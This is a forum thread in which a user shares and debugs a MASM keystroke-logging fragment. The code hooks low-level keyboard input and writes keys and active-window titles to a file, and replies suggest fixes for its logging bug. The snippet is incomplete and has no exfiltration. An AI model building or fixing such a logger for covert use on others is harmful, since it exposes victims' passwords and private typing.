    <div class="body">.ELSEIF uMsg==WM_KEYHOOK <br />         invoke GetForegroundWindow          <br />         .IF eax == hWndFG        <br />            invoke WriteFile, fWnd, addr lParam, 1, addr bytesWritten, NULL<br />         .ELSE <br />            mov hWndFG, eax<br />            invoke GetWindowText, hWndFG, addr AppName, 1024 <br />            invoke WriteFile, fWnd, addr AppName, eax, addr bytesWritten, NULL<br />            invoke WriteFile, fWnd, addr CRLF, 2, addr bytesWritten, NULL<br />;            invoke PostMessage, hWnd, WM_KEYHOOK, wParam, lParam<br />         .ENDIF<br />    .ELSE<br /><br />Here is a snippet of my code.  If the hWnd changes from keystroke to keystroke, the Application name will be in the file, otherwise a keystroke will be logged. I think the code speaks for itself. <br /><br />This P.O.S code complies fine, but when  I go to run it, it doesn't work correctly. ONLY the appname is logged, in place of keystrokes. I had to comment out the postmessage line to stop the prog from writing the appname over and over! I'm not changing  the active window when I run the program. Is my logic wrong? Is the window handle constantly changing? <br /><br />Please help..... in desprate need.....<br /><br />thanks in advance........<br />lackluster</div>

    <div class="body">Afternoon, Lackluster.<br /><br />I dunno if this'll help, however it's worth a try.<br /><br />It could be that the *.if....else* macro is mucking around with eax (This is a total guess - I really wouldn't have a clue ;) ).<br />Try adding another *invoke GetForegroundWindow* straight after the *.ELSE* and see if it works.<br /><br />Cheers,<br />Scronty</div>

    <div class="body">lackluster, forgive me if my question is stupid but is your hWndFG a &quot;global&quot; variable?</div>

    <div class="body">What is WM_KEYHOOK <br />and why do you think that lParam should have address of<br />the byte made by keystruck?</div>

    <div class="body">My best guess would be how have you declared 'hWndFG'.<br /><br />Same as what  japheth was saying, if you have made hWndFG a LOCAL varible on the stack, its value is highly likly to change each time the WM_KEYHOOK message is recieved.</div>

    <div class="body">The variable is global defined in the .data section as:<br />hWndFG dd 0 <br /><br />WM_KEYHOOK is defined under .const as:<br />WM_KEYHOOK equ WM_USER + 6<br /><br />It does return a keystroke. I'm using WH_KEYBOARD_LL hook type and passing the time stamp in wParam, and the char (after converting the VK) in lParam.<br /><br />I haven't yet been home to check Scronty's (great sig by the way ;)) suggestion.</div>

    <div class="body">NOpe, that didn't work either. I changed the .IF .ELSE to cmp jne. I think I've tried everything. I'm going to go cry like a schoolgirl now...</div>

    <div class="body">lackluster,<br /><br />use OutputDebugString to display the hWnd and other interesting stuff. Since the low level keyboard hook is a bit time critical, I suggest to deactivate the writing to files in the first step.<br /><br />To show the output of OutputdebugString in Windows NT/2000, there is freeware available.<br /><br />japheth</div>

    <div class="body">Japeth,<br />    Actually that's the reason for my most recent post (Int--&gt;String). I was going to display the hWnd in the messageboxes.  Would there be an advantage to using the OutputDebugString instead?</div>
